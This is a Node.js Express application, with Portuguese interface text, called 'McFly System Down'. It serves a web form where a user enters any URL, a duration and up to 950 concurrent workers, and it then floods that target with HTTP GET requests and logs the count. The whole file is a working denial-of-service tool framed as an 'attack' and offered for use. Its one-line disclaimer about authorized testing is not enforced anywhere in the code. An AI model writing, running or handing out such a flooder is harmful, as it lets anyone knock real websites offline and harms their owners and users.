import express from 'express';
import axios from 'axios';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Limites
const MAX_TIME = 500; // segundos
const MAX_THREADS = 950;

// Função flood com logs
async function flood(url, tempo, threads) {
  const endTime = Date.now() + tempo * 1000;
  let requestsCount = 0;

  async function attackThread(threadId) {
    while (Date.now() < endTime) {
      try {
        await axios.get(url);
        requestsCount++;

        if (requestsCount % 50 === 0) {
          console.log(`Thread ${threadId}: ${requestsCount} requisições feitas para ${url}`);
        }
      } catch (e) {
        console.log(`Thread ${threadId}: erro na requisição - ${e.message}`);
      }
    }
  }

  let promises = [];
  for (let i = 1; i <= threads; i++) {
    promises.push(attackThread(i));
  }

  await Promise.all(promises);
  console.log(`Ataque finalizado: ${requestsCount} requisições feitas para ${url}`);
  return requestsCount;
}

// Página simples com form
app.get('/', (req, res) => {
  res.send(`
    <html>
    <head>
      <title>McFly System Down - Stress Test</title>
      <style>
        body { background: #121212; color: #0ff; font-family: Arial, sans-serif; display:flex; flex-direction:column; align-items:center; padding:20px; }
        h1 { color: #0f0; }
        input, button { padding: 10px; margin: 5px; border-radius: 5px; border:none; font-size: 16px; }
        input { width: 300px; }
        button { background: #0f0; color: #000; cursor: pointer; }
        button:hover { background: #0c0; }
        .container { max-width: 400px; background: #222; padding: 20px; border-radius: 10px; }
        small { color: #aaa; }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🔥 McFly System Down</h1>
        <form method="POST" action="/attack">
          <input type="url" name="url" placeholder="URL (https://...)" required pattern="https?://.+" /><br/>
          <input type="number" name="tempo" placeholder="Tempo (segundos, max 500)" min="1" max="${MAX_TIME}" required /><br/>
          <input type="number" name="threads" placeholder="Threads (max 700)" min="1" max="${MAX_THREADS}" required /><br/>
          <button type="submit">Executar Ataque</button>
        </form>
        <small>⚠️ Uso exclusivo para testes em sites autorizados pela sua equipe.</small>
      </div>
    </body>
    </html>
  `);
});

// Rota do ataque
app.post('/attack', async (req, res) => {
  const { url, tempo, threads } = req.body;
  const t = Math.min(Number(tempo), MAX_TIME);
  const th = Math.min(Number(threads), MAX_THREADS);

  if (!url || !/^https?:\/\/.+/.test(url)) {
    return res.send('URL inválida!');
  }

  console.log(`Iniciando ataque em ${url} por ${t}s com ${th} threads...`);

  flood(url, t, th).then(count => {
    console.log(`Ataque finalizado. Total requisições: ${count}`);
  }).catch(e => {
    console.log('Erro no ataque:', e);
  });

  res.send(`
    <p>🚀 Ataque iniciado em <strong>${url}</strong> por <strong>${t}</strong> segundos com <strong>${th}</strong> threads.</p>
    <p>Confira os logs no console do servidor para acompanhar o progresso.</p>
    <p><a href="/">Voltar</a></p>
  `);
});

// Start servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`McFly System Down rodando na porta ${PORT}`);
});
